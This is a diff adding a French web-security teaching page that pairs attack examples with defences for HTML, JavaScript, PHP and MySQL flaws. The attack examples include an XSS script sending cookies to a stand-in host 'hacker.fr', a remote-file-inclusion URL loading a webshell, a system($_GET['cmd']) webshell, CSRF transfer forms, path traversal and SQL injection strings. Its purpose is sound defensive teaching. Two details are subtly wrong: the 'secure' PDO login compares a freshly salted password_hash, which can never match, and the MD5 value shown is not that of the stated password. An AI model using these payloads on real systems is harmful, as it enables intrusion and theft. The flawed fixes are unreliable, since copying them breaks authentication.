+    <span class="ca">position</span>: absolute;
+    <span class="ca">opacity</span>: <span class="cd">0.001</span>; <span class="cc">/* quasi invisible */</span>
+    <span class="ca">z-index</span>: 999;
+    <span class="ca">width</span>: 100%; <span class="ca">height</span>: 100%;
+  }
+<span class="ck">&lt;/style&gt;</span>
+
+<span class="cc">&lt;!-- Page légitime chargée en transparence --&gt;</span>
+<span class="cd">&lt;iframe src="https://mabanque.fr/confirmer-virement"&gt;&lt;/iframe&gt;</span>
+
+<span class="cc">&lt;!-- Bouton visible mais clique sur l'iframe --&gt;</span>
+&lt;button&gt;Gagner un prix !&lt;/button&gt;</code></pre>
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="🛡️ ">Parade</div>
+          <div class="parade-box">
+            <ul>
+              <li>En-tête HTTP <strong>X-Frame-Options: DENY</strong> sur le serveur</li>
+              <li>Directive CSP : <strong>Content-Security-Policy: frame-ancestors 'none'</strong></li>
+              <li>Vérification JavaScript (framebuster) pour détecter l'intégration en iframe</li>
+            </ul>
+          </div>
+          <div class="code-wrap" style="margin-top:12px;">
+            <div class="code-topbar">
+              <div class="code-dots"><div class="code-dot cd-r"></div><div class="code-dot cd-y"></div><div class="code-dot cd-g"></div></div>
+              <span class="code-lang">PHP — en-têtes sécurisés</span>
+            </div>
+            <pre><code><span class="ck">header</span>(<span class="cs">'X-Frame-Options: DENY'</span>);
+<span class="ck">header</span>(<span class="cs">"Content-Security-Policy: frame-ancestors 'none'"</span>);</code></pre>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Faille 1.2 -->
+    <div class="flaw-row" id="html-formulaires">
+      <div class="flaw-left">
+        <div class="flaw-severity sev-moyenne">
+          <span class="severity-dot"></span>Moyenne
+        </div>
+        <div class="flaw-num">1.2</div>
+      </div>
+      <div class="flaw-content">
+        <h3 class="flaw-title">📝 Formulaires non sécurisés</h3>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="📖 ">Explication</div>
+          <div class="sub-text">
+            Les formulaires soumis en <strong>HTTP</strong> (non HTTPS) transmettent les données en clair sur le réseau.
+            Un attaquant peut les intercepter via une attaque <strong>Man-in-the-Middle (MITM)</strong>.
+            L'absence de validation des attributs (<code>type</code>, <code>maxlength</code>, <code>pattern</code>)
+            permet d'envoyer des données inattendues au serveur.
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="💡 ">Exemple</div>
+          <div class="code-wrap">
+            <div class="code-topbar">
+              <div class="code-dots"><div class="code-dot cd-r"></div><div class="code-dot cd-y"></div><div class="code-dot cd-g"></div></div>
+              <span class="code-lang">HTML — formulaire vulnérable</span>
+            </div>
+            <pre><code><span class="cc">&lt;!-- ❌ HTTP + mot de passe en type="text" --&gt;</span>
+<span class="cd">&lt;form action="http://site.fr/login" method="POST"&gt;</span>
+  &lt;input <span class="cd">type="text"</span>  name="username"&gt;
+  &lt;input <span class="cd">type="text"</span>  name="password"&gt; <span class="cc">&lt;!-- visible en clair ! --&gt;</span>
+  &lt;button&gt;Connexion&lt;/button&gt;
+&lt;/form&gt;
+<span class="cc">&lt;!-- Wireshark peut capturer username + password en direct --&gt;</span></code></pre>
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="🛡️ ">Parade</div>
+          <div class="parade-box">
+            <ul>
+              <li>Toujours utiliser <strong>HTTPS</strong> (certificat TLS obligatoire)</li>
+              <li><strong>type="password"</strong> pour les champs de mot de passe</li>
+              <li>Attributs HTML5 : <strong>required</strong>, <strong>maxlength</strong>, <strong>pattern</strong></li>
+              <li>Valider également <strong>côté serveur</strong> (la validation HTML est contournable)</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Faille 1.3 -->
+    <div class="flaw-row" id="html-source">
+      <div class="flaw-left">
+        <div class="flaw-severity sev-haute">
+          <span class="severity-dot"></span>Haute
+        </div>
+        <div class="flaw-num">1.3</div>
+      </div>
+      <div class="flaw-content">
+        <h3 class="flaw-title">👁️ Données sensibles dans le code source</h3>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="📖 ">Explication</div>
+          <div class="sub-text">
+            Le HTML est <strong>entièrement lisible</strong> via Ctrl+U. Des développeurs laissent parfois
+            des informations sensibles dans la page : clés API, identifiants admin, commentaires de débogage.
+            Les <code>&lt;input type="hidden"&gt;</code> sont également visibles et modifiables par l'utilisateur.
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="💡 ">Exemple</div>
+          <div class="code-wrap">
+            <div class="code-topbar">
+              <div class="code-dots"><div class="code-dot cd-r"></div><div class="code-dot cd-y"></div><div class="code-dot cd-g"></div></div>
+              <span class="code-lang">HTML — code source exposé</span>
+            </div>
+            <pre><code><span class="cc">&lt;!-- TODO: supprimer avant production --&gt;</span>
+<span class="cd">&lt;!-- admin / MotDePasse123 --&gt;</span>
+<span class="cd">&lt;!-- Clé API : AIzaSyD-xxxxxxxxxxxxxxxxx --&gt;</span>
+
+<span class="cc">&lt;!-- Un attaquant peut modifier la valeur "admin" dans la console --&gt;</span>
+<span class="cd">&lt;input type="hidden" name="user_role" value="admin"&gt;</span></code></pre>
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="🛡️ ">Parade</div>
+          <div class="parade-box">
+            <ul>
+              <li>Ne <strong>jamais</strong> stocker de secrets dans le HTML ni les commentaires</li>
+              <li>Stocker les clés API côté serveur en <strong>variables d'environnement</strong></li>
+              <li>Ne jamais faire confiance aux champs cachés pour la sécurité — vérifier côté serveur</li>
+              <li>Utiliser des <strong>linters</strong> pour détecter les fuites avant le déploiement</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- ════════════════════════════════════════════════
+     SECTION 2 — JavaScript
+════════════════════════════════════════════════ -->
+<section id="javascript" class="tech-section t-js">
+  <div class="wrap">
+
+    <p class="s-label" data-num="02" aria-hidden="true">Langage côté client</p>
+
+    <div class="tech-header">
+      <div class="tech-icon" aria-hidden="true">JS</div>
+      <div class="tech-title-block">
+        <h2>JavaScript</h2>
+        <p>Langage de script exécuté dans le navigateur</p>
+      </div>
+    </div>
+
+    <!-- Faille 2.1 XSS -->
+    <div class="flaw-row" id="js-xss">
+      <div class="flaw-left">
+        <div class="flaw-severity sev-critique">
+          <span class="severity-dot"></span>Critique
+        </div>
+        <div class="flaw-num">2.1</div>
+      </div>
+      <div class="flaw-content">
+        <h3 class="flaw-title">⚡ XSS — Cross-Site Scripting</h3>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="📖 ">Explication</div>
+          <div class="sub-text">
+            Le <strong>XSS</strong> est l'une des failles les plus répandues (OWASP Top 10). Elle survient quand
+            un site affiche du contenu utilisateur sans le filtrer, permettant d'injecter du JavaScript malveillant
+            exécuté chez les autres visiteurs. Conséquences : vol de cookies de session, redirection, keylogger.
+            <ul style="margin-top:10px;">
+              <li><strong>XSS Réfléchi :</strong> script dans l'URL renvoyé par le serveur</li>
+              <li><strong>XSS Stocké :</strong> script sauvegardé en base et affiché à tous</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="💡 ">Exemple</div>
+          <div class="code-wrap">
+            <div class="code-topbar">
+              <div class="code-dots"><div class="code-dot cd-r"></div><div class="code-dot cd-y"></div><div class="code-dot cd-g"></div></div>
+              <span class="code-lang">JavaScript — injection XSS</span>
+            </div>
+            <pre><code><span class="cc">// L'attaquant poste ce commentaire dans un formulaire :</span>
+<span class="cd">&lt;script&gt;
+  document.location = 'https://hacker.fr/steal?c=' + document.cookie;
+&lt;/script&gt;</span>
+<span class="cc">// → les cookies de chaque visiteur sont envoyés à l'attaquant</span>
+
+<span class="cc">// Code JS vulnérable (innerHTML interprète le HTML) :</span>
+<span class="cd">document.getElementById('msg').innerHTML = userInput;</span>
+<span class="cc">// ↑ le script s'exécute !</span></code></pre>
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="🛡️ ">Parade</div>
+          <div class="parade-box">
+            <ul>
+              <li>Utiliser <strong>textContent</strong> au lieu de <strong>innerHTML</strong></li>
+              <li>Encoder les données côté serveur (<code>&lt;</code> → <code>&amp;lt;</code>)</li>
+              <li>Mettre en place une <strong>Content Security Policy (CSP)</strong></li>
+              <li>Cookies avec le flag <strong>HttpOnly</strong> pour les rendre inaccessibles depuis JS</li>
+            </ul>
+          </div>
+          <div class="code-wrap" style="margin-top:12px;">
+            <div class="code-topbar">
+              <div class="code-dots"><div class="code-dot cd-r"></div><div class="code-dot cd-y"></div><div class="code-dot cd-g"></div></div>
+              <span class="code-lang">JavaScript — version sécurisée</span>
+            </div>
+            <pre><code><span class="cc">// ❌ Dangereux :</span>
+<span class="cd">element.innerHTML = userInput;</span>
+
+<span class="cc">// ✅ Sécurisé :</span>
+<span class="cg">element.textContent = userInput;</span>
+
+<span class="cc">// ✅ Encoder le HTML :</span>
+<span class="ck">function</span> escapeHTML(str) {
+  <span class="ck">return</span> str
+    .replace(<span class="cs">/&amp;/g</span>, <span class="cs">'&amp;amp;'</span>)
+    .replace(<span class="cs">/&lt;/g</span>, <span class="cs">'&amp;lt;'</span>)
+    .replace(<span class="cs">/&gt;/g</span>, <span class="cs">'&amp;gt;'</span>);
+}</code></pre>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Faille 2.2 LocalStorage -->
+    <div class="flaw-row" id="js-localstorage">
+      <div class="flaw-left">
+        <div class="flaw-severity sev-haute">
+          <span class="severity-dot"></span>Haute
+        </div>
+        <div class="flaw-num">2.2</div>
+      </div>
+      <div class="flaw-content">
+        <h3 class="flaw-title">🗄️ Manipulation DOM & stockage local</h3>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="📖 ">Explication</div>
+          <div class="sub-text">
+            Le code JavaScript est <strong>entièrement visible</strong> via F12. Un attaquant peut lire la logique,
+            modifier les variables en console, et accéder aux données dans <code>localStorage</code>.
+            En cas de XSS, tout ce qui est dans <code>localStorage</code> est immédiatement compromis.
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="💡 ">Exemple</div>
+          <div class="code-wrap">
+            <div class="code-topbar">
+              <div class="code-dots"><div class="code-dot cd-r"></div><div class="code-dot cd-y"></div><div class="code-dot cd-g"></div></div>
+              <span class="code-lang">JavaScript — localStorage mal utilisé</span>
+            </div>
+            <pre><code><span class="cc">// ❌ Token sensible dans localStorage (accessible par tout JS) :</span>
+<span class="cd">localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiJ9...');</span>
+<span class="cd">localStorage.setItem('role',  'admin');</span>
+
+<span class="cc">// ❌ Vérification de sécurité uniquement en JS :</span>
+<span class="ck">if</span> (localStorage.getItem(<span class="cs">'role'</span>) === <span class="cs">'admin'</span>) {
+  <span class="cd">showAdminPanel();</span>
+  <span class="cc">// L'attaquant tape en console : localStorage.setItem('role','admin')</span>
+}</code></pre>
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="🛡️ ">Parade</div>
+          <div class="parade-box">
+            <ul>
+              <li>Ne jamais stocker de tokens sensibles dans <strong>localStorage</strong></li>
+              <li>Préférer les cookies <strong>HttpOnly + Secure + SameSite=Strict</strong></li>
+              <li>Vérifier les droits et rôles <strong>côté serveur uniquement</strong></li>
+              <li>Minifier/obfusquer le JS en production pour compliquer la lecture</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Faille 2.3 CSRF -->
+    <div class="flaw-row" id="js-csrf">
+      <div class="flaw-left">
+        <div class="flaw-severity sev-haute">
+          <span class="severity-dot"></span>Haute
+        </div>
+        <div class="flaw-num">2.3</div>
+      </div>
+      <div class="flaw-content">
+        <h3 class="flaw-title">🔄 CSRF — Cross-Site Request Forgery</h3>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="📖 ">Explication</div>
+          <div class="sub-text">
+            Le <strong>CSRF</strong> force le navigateur d'un utilisateur connecté à effectuer des requêtes
+            non voulues vers un site où il est authentifié. L'attaquant piège la victime (lien ou image dans
+            un e-mail) et son navigateur envoie automatiquement ses cookies de session.
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="💡 ">Exemple</div>
+          <div class="code-wrap">
+            <div class="code-topbar">
+              <div class="code-dots"><div class="code-dot cd-r"></div><div class="code-dot cd-y"></div><div class="code-dot cd-g"></div></div>
+              <span class="code-lang">HTML — attaque CSRF</span>
+            </div>
+            <pre><code><span class="cc">&lt;!-- Page malveillante envoyée à la victime --&gt;</span>
+<span class="cc">&lt;!-- Si la victime est connectée à mabanque.fr, ses cookies
+     sont envoyés automatiquement ! --&gt;</span>
+
+<span class="cc">&lt;!-- Méthode GET (image 0×0) : --&gt;</span>
+<span class="cd">&lt;img src="https://mabanque.fr/virement?montant=5000&amp;vers=attaquant"
+     width="0" height="0"&gt;</span>
+
+<span class="cc">&lt;!-- Méthode POST (formulaire soumis automatiquement) : --&gt;</span>
+<span class="cd">&lt;form action="https://mabanque.fr/virement" method="POST"&gt;
+  &lt;input type="hidden" name="montant" value="5000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</span></code></pre>
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="🛡️ ">Parade</div>
+          <div class="parade-box">
+            <ul>
+              <li>Implémenter des <strong>jetons CSRF</strong> (token aléatoire unique par session)</li>
+              <li>Cookie avec <strong>SameSite=Strict</strong> pour bloquer les requêtes cross-site</li>
+              <li>Vérifier l'en-tête <strong>Origin</strong> ou <strong>Referer</strong> côté serveur</li>
+              <li>Re-authentification pour les actions critiques (virement, suppression)</li>
+            </ul>
+          </div>
+          <div class="code-wrap" style="margin-top:12px;">
+            <div class="code-topbar">
+              <div class="code-dots"><div class="code-dot cd-r"></div><div class="code-dot cd-y"></div><div class="code-dot cd-g"></div></div>
+              <span class="code-lang">PHP — jeton CSRF</span>
+            </div>
+            <pre><code><span class="cc">// Générer et stocker le token en session :</span>
+<span class="cg">$_SESSION['csrf'] = bin2hex(random_bytes(32));</span>
+
+<span class="cc">// Dans le formulaire :</span>
+<span class="cg">&lt;input type="hidden" name="csrf" value="&lt;?= $_SESSION['csrf'] ?&gt;"&gt;</span>
+
+<span class="cc">// Vérification à la réception :</span>
+<span class="ck">if</span> (!<span class="ck">hash_equals</span>(<span class="ck">$_SESSION</span>[<span class="cs">'csrf'</span>], <span class="ck">$_POST</span>[<span class="cs">'csrf'</span>])) {
+  <span class="cd">die</span>(<span class="cs">'Attaque CSRF détectée !'</span>);
+}</code></pre>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- ════════════════════════════════════════════════
+     SECTION 3 — PHP
+════════════════════════════════════════════════ -->
+<section id="php" class="tech-section t-php">
+  <div class="wrap">
+
+    <p class="s-label" data-num="03" aria-hidden="true">Langage côté serveur</p>
+
+    <div class="tech-header">
+      <div class="tech-icon" aria-hidden="true">PHP</div>
+      <div class="tech-title-block">
+        <h2>PHP</h2>
+        <p>Hypertext Preprocessor · Langage serveur dynamique</p>
+      </div>
+    </div>
+
+    <!-- Faille 3.1 LFI/RFI -->
+    <div class="flaw-row" id="php-lfi">
+      <div class="flaw-left">
+        <div class="flaw-severity sev-critique">
+          <span class="severity-dot"></span>Critique
+        </div>
+        <div class="flaw-num">3.1</div>
+      </div>
+      <div class="flaw-content">
+        <h3 class="flaw-title">📂 Inclusion de fichiers (LFI / RFI)</h3>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="📖 ">Explication</div>
+          <div class="sub-text">
+            La <strong>LFI (Local File Inclusion)</strong> permet d'inclure un fichier local arbitraire en
+            manipulant un paramètre d'URL. La <strong>RFI (Remote File Inclusion)</strong> va plus loin :
+            elle permet d'inclure un fichier distant contrôlé par l'attaquant, menant à une
+            <strong>exécution de code à distance (RCE)</strong>.
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="💡 ">Exemple</div>
+          <div class="code-wrap">
+            <div class="code-topbar">
+              <div class="code-dots"><div class="code-dot cd-r"></div><div class="code-dot cd-y"></div><div class="code-dot cd-g"></div></div>
+              <span class="code-lang">PHP — vulnérable</span>
+            </div>
+            <pre><code><span class="cc">// ❌ Inclusion directe sans validation :</span>
+<span class="ck">$page</span> = <span class="ck">$_GET</span>[<span class="cs">'page'</span>];
+<span class="cd">include($page);</span>
+
+<span class="cc">// ❌ Attaque LFI — lire /etc/passwd :
+// site.fr/?page=../../../../etc/passwd
+
+// ❌ Attaque RFI — exécuter un shell distant :
+// site.fr/?page=http://hacker.fr/shell.php
+// shell.php contient : &lt;?php system($_GET['cmd']); ?&gt;
+// → contrôle total du serveur !</span></code></pre>
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="🛡️ ">Parade</div>
+          <div class="parade-box">
+            <ul>
+              <li>Utiliser une <strong>liste blanche</strong> des fichiers autorisés</li>
+              <li>Ne jamais passer un paramètre utilisateur à <strong>include()</strong> directement</li>
+              <li>Désactiver <strong>allow_url_include</strong> dans php.ini pour bloquer les RFI</li>
+              <li>Valider et nettoyer tous les paramètres d'entrée</li>
+            </ul>
+          </div>
+          <div class="code-wrap" style="margin-top:12px;">
+            <div class="code-topbar">
+              <div class="code-dots"><div class="code-dot cd-r"></div><div class="code-dot cd-y"></div><div class="code-dot cd-g"></div></div>
+              <span class="code-lang">PHP — liste blanche</span>
+            </div>
+            <pre><code><span class="cg">$pages_ok</span> = [<span class="cs">'accueil'</span>, <span class="cs">'contact'</span>, <span class="cs">'about'</span>];
+<span class="ck">$page</span>    = <span class="ck">$_GET</span>[<span class="cs">'page'</span>] ?? <span class="cs">'accueil'</span>;
+
+<span class="ck">if</span> (<span class="ck">in_array</span>(<span class="ck">$page</span>, <span class="cg">$pages_ok</span>)) {
+    <span class="cg">include</span>(<span class="cs">'pages/'</span> . <span class="ck">$page</span> . <span class="cs">'.php'</span>);
+} <span class="ck">else</span> {
+    <span class="ck">http_response_code</span>(<span class="cn">404</span>);
+    include(<span class="cs">'pages/404.php'</span>);
+}</code></pre>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Faille 3.2 Upload -->
+    <div class="flaw-row" id="php-upload">
+      <div class="flaw-left">
+        <div class="flaw-severity sev-critique">
+          <span class="severity-dot"></span>Critique
+        </div>
+        <div class="flaw-num">3.2</div>
+      </div>
+      <div class="flaw-content">
+        <h3 class="flaw-title">📤 Upload de fichiers malveillants</h3>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="📖 ">Explication</div>
+          <div class="sub-text">
+            Sans vérification stricte, un attaquant peut uploader un fichier PHP déguisé en image.
+            Si ce fichier est accessible via le web, il peut exécuter du code arbitraire —
+            c'est un <strong>webshell</strong>. L'extension <code>.php.jpg</code> ou la manipulation
+            du Content-Type peut tromper une vérification naïve.
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="💡 ">Exemple</div>
+          <div class="code-wrap">
+            <div class="code-topbar">
+              <div class="code-dots"><div class="code-dot cd-r"></div><div class="code-dot cd-y"></div><div class="code-dot cd-g"></div></div>
+              <span class="code-lang">PHP — upload sans vérification</span>
+            </div>
+            <pre><code><span class="cc">// ❌ Aucune vérification du type de fichier :</span>
+<span class="cd">move_uploaded_file(
+  $_FILES['fichier']['tmp_name'],
+  'uploads/' . $_FILES['fichier']['name']
+);</span>
+
+<span class="cc">// L'attaquant envoie "shell.php" contenant :
+// &lt;?php system($_GET['cmd']); ?&gt;
+// Puis accède à : site.fr/uploads/shell.php?cmd=ls
+// → contrôle total du serveur !</span></code></pre>
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="🛡️ ">Parade</div>
+          <div class="parade-box">
+            <ul>
+              <li>Vérifier l'extension ET le type MIME réel avec <strong>finfo_file()</strong></li>
+              <li>Renommer les fichiers upladés (nom aléatoire, sans extension exécutable)</li>
+              <li>Stocker les uploads <strong>hors de la racine web</strong></li>
+              <li>Limiter la taille maximale des fichiers uploadés</li>
+            </ul>
+          </div>
+          <div class="code-wrap" style="margin-top:12px;">
+            <div class="code-topbar">
+              <div class="code-dots"><div class="code-dot cd-r"></div><div class="code-dot cd-y"></div><div class="code-dot cd-g"></div></div>
+              <span class="code-lang">PHP — upload sécurisé</span>
+            </div>
+            <pre><code><span class="cg">$ext_ok</span>  = [<span class="cs">'jpg'</span>, <span class="cs">'jpeg'</span>, <span class="cs">'png'</span>, <span class="cs">'gif'</span>];
+<span class="cg">$mime_ok</span> = [<span class="cs">'image/jpeg'</span>, <span class="cs">'image/png'</span>, <span class="cs">'image/gif'</span>];
+
+<span class="ck">$finfo</span> = <span class="ck">finfo_open</span>(FILEINFO_MIME_TYPE);
+<span class="ck">$mime</span>  = <span class="ck">finfo_file</span>(<span class="ck">$finfo</span>, <span class="ck">$_FILES</span>[<span class="cs">'f'</span>][<span class="cs">'tmp_name'</span>]);
+<span class="ck">$ext</span>   = <span class="ck">strtolower</span>(<span class="ck">pathinfo</span>(<span class="ck">$_FILES</span>[<span class="cs">'f'</span>][<span class="cs">'name'</span>], PATHINFO_EXTENSION));
+
+<span class="ck">if</span> (<span class="ck">in_array</span>(<span class="ck">$mime</span>, <span class="cg">$mime_ok</span>) && <span class="ck">in_array</span>(<span class="ck">$ext</span>, <span class="cg">$ext_ok</span>)) {
+    <span class="ck">$nom</span> = <span class="ck">bin2hex</span>(<span class="ck">random_bytes</span>(<span class="cn">16</span>)) . <span class="cs">'.'</span> . <span class="ck">$ext</span>;
+    <span class="cg">move_uploaded_file</span>(<span class="ck">$_FILES</span>[<span class="cs">'f'</span>][<span class="cs">'tmp_name'</span>],
+                       <span class="cs">'/var/stockage_securise/'</span> . <span class="ck">$nom</span>);
+}</code></pre>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Faille 3.3 Erreurs -->
+    <div class="flaw-row" id="php-erreurs">
+      <div class="flaw-left">
+        <div class="flaw-severity sev-moyenne">
+          <span class="severity-dot"></span>Moyenne
+        </div>
+        <div class="flaw-num">3.3</div>
+      </div>
+      <div class="flaw-content">
+        <h3 class="flaw-title">⚠️ Exposition des erreurs PHP</h3>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="📖 ">Explication</div>
+          <div class="sub-text">
+            En production, PHP peut afficher des erreurs détaillées révélant des informations critiques :
+            chemins internes, noms de tables SQL, version PHP, structure du code. Ces éléments facilitent
+            la cartographie du système par un attaquant.
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="💡 ">Exemple</div>
+          <div class="code-wrap">
+            <div class="code-topbar">
+              <div class="code-dots"><div class="code-dot cd-r"></div><div class="code-dot cd-y"></div><div class="code-dot cd-g"></div></div>
+              <span class="code-lang">Message d'erreur exposé</span>
+            </div>
+            <pre><code><span class="cd">Warning: mysqli_connect(): Access denied for user 'root'@'localhost'
+  in /var/www/html/config/database.php on line 12</span>
+
+<span class="cc">// L'attaquant apprend :
+// → chemin exact : /var/www/html/config/database.php
+// → compte MySQL : root (privilèges maximaux)
+// → structure de la connexion BDD</span></code></pre>
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="🛡️ ">Parade</div>
+          <div class="parade-box">
+            <ul>
+              <li><strong>display_errors = Off</strong> dans php.ini en production</li>
+              <li>Journaliser dans un fichier log sécurisé : <strong>log_errors = On</strong></li>
+              <li>Pages d'erreur personnalisées (403, 404, 500) sans détails techniques</li>
+              <li>Ne jamais utiliser le compte <strong>root</strong> MySQL pour l'application</li>
+            </ul>
+          </div>
+          <div class="code-wrap" style="margin-top:12px;">
+            <div class="code-topbar">
+              <div class="code-dots"><div class="code-dot cd-r"></div><div class="code-dot cd-y"></div><div class="code-dot cd-g"></div></div>
+              <span class="code-lang">php.ini — production</span>
+            </div>
+            <pre><code><span class="cg">display_errors        = Off</span>
+<span class="cg">display_startup_errors = Off</span>
+<span class="cg">log_errors            = On</span>
+<span class="cg">error_log             = /var/log/php/erreurs.log</span>
+<span class="ca">error_reporting       = E_ALL</span>  <span class="cc">; loguer tout, afficher rien</span></code></pre>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- ════════════════════════════════════════════════
+     SECTION 4 — MySQL
+════════════════════════════════════════════════ -->
+<section id="mysql" class="tech-section t-mysql">
+  <div class="wrap">
+
+    <p class="s-label" data-num="04" aria-hidden="true">Base de données relationnelle</p>
+
+    <div class="tech-header">
+      <div class="tech-icon" aria-hidden="true">SQL</div>
+      <div class="tech-title-block">
+        <h2>MySQL</h2>
+        <p>Système de gestion de bases de données relationnelles</p>
+      </div>
+    </div>
+
+    <!-- Faille 4.1 SQLi -->
+    <div class="flaw-row" id="mysql-sqli">
+      <div class="flaw-left">
+        <div class="flaw-severity sev-critique">
+          <span class="severity-dot"></span>Critique
+        </div>
+        <div class="flaw-num">4.1</div>
+      </div>
+      <div class="flaw-content">
+        <h3 class="flaw-title">💉 Injection SQL</h3>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="📖 ">Explication</div>
+          <div class="sub-text">
+            L'<strong>injection SQL</strong> est la faille la plus dangereuse (OWASP #1 pendant des années).
+            Elle survient quand des données utilisateur sont insérées directement dans une requête SQL sans
+            nettoyage. L'attaquant peut :
+            <ul style="margin-top:8px;">
+              <li>Contourner l'authentification (connexion sans mot de passe)</li>
+              <li>Extraire toutes les données de la base (mots de passe, cartes bancaires…)</li>
+              <li>Modifier ou supprimer des données (<code>DROP TABLE</code>)</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="💡 ">Exemple</div>
+          <div class="code-wrap">
+            <div class="code-topbar">
+              <div class="code-dots"><div class="code-dot cd-r"></div><div class="code-dot cd-y"></div><div class="code-dot cd-g"></div></div>
+              <span class="code-lang">PHP + SQL — vulnérable</span>
+            </div>
+            <pre><code><span class="cc">// ❌ Concaténation directe :</span>
+<span class="cd">$sql = "SELECT * FROM users
+        WHERE username='$user' AND password='$pass'";</span>
+
+<span class="cc">// Saisie de l'attaquant : admin'--
+// La requête devient :
+// SELECT * FROM users WHERE username='admin'--' AND password='...'
+//                                              ^^ commente le reste
+// → connexion en tant qu'admin sans mot de passe !
+
+// Avec UNION, exfiltration totale :
+// ' UNION SELECT username, password, 3 FROM users--</span></code></pre>
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="🛡️ ">Parade</div>
+          <div class="parade-box">
+            <ul>
+              <li>Utiliser les <strong>requêtes préparées (Prepared Statements)</strong> avec PDO</li>
+              <li>Ne jamais concaténer une variable utilisateur dans une requête SQL</li>
+              <li>Principe de <strong>moindre privilège</strong> : compte MySQL sans DROP ni FILE</li>
+              <li>Utiliser un <strong>WAF</strong> (Web Application Firewall)</li>
+            </ul>
+          </div>
+          <div class="code-wrap" style="margin-top:12px;">
+            <div class="code-topbar">
+              <div class="code-dots"><div class="code-dot cd-r"></div><div class="code-dot cd-y"></div><div class="code-dot cd-g"></div></div>
+              <span class="code-lang">PHP — requêtes préparées PDO</span>
+            </div>
+            <pre><code><span class="cc">// ✅ Paramètres traités comme des données, jamais comme du code :</span>
+<span class="cg">$stmt</span> = <span class="ck">$pdo</span>-><span class="cg">prepare</span>(
+    <span class="cg">"SELECT * FROM users WHERE username = ? AND password_hash = ?"</span>
+);
+<span class="cg">$stmt</span>-><span class="cg">execute</span>([<span class="ck">$_POST</span>[<span class="cs">'username'</span>], <span class="ck">password_hash</span>(<span class="ck">$_POST</span>[<span class="cs">'password'</span>], PASSWORD_BCRYPT)]);
+<span class="cc">// → injection SQL impossible !</span></code></pre>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Faille 4.2 Hashage -->
+    <div class="flaw-row" id="mysql-hash">
+      <div class="flaw-left">
+        <div class="flaw-severity sev-critique">
+          <span class="severity-dot"></span>Critique
+        </div>
+        <div class="flaw-num">4.2</div>
+      </div>
+      <div class="flaw-content">
+        <h3 class="flaw-title">🔑 Mots de passe en clair & hashage faible</h3>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="📖 ">Explication</div>
+          <div class="sub-text">
+            Stocker les mots de passe en clair ou avec <strong>MD5/SHA1</strong> est critique.
+            En cas de fuite, tous les mots de passe sont compromis. MD5 et SHA1 sont
+            <strong>cassés</strong> pour les mots de passe : des <strong>tables arc-en-ciel</strong>
+            permettent de retrouver le mot de passe original en quelques secondes sur des sites en ligne.
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="💡 ">Exemple</div>
+          <div class="code-wrap">
+            <div class="code-topbar">
+              <div class="code-dots"><div class="code-dot cd-r"></div><div class="code-dot cd-y"></div><div class="code-dot cd-g"></div></div>
+              <span class="code-lang">SQL — base vulnérable</span>
+            </div>
+            <pre><code><span class="cc">-- ❌ Mots de passe en clair :</span>
+<span class="cd">SELECT * FROM users;</span>
+<span class="cc">-- id | username | password
+-- 1  | alice    | motdepasse123
+-- 2  | admin    | Admin@2024!</span>
+
+<span class="cc">-- ❌ MD5 cassable en ligne en quelques secondes :</span>
+<span class="cd">INSERT INTO users VALUES (1, 'alice', MD5('motdepasse123'));
+-- → 5f4dcc3b5aa765d61d8327deb882cf99
+-- crackstation.net retrouve ce hash instantanément !</span></code></pre>
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="🛡️ ">Parade</div>
+          <div class="parade-box">
+            <ul>
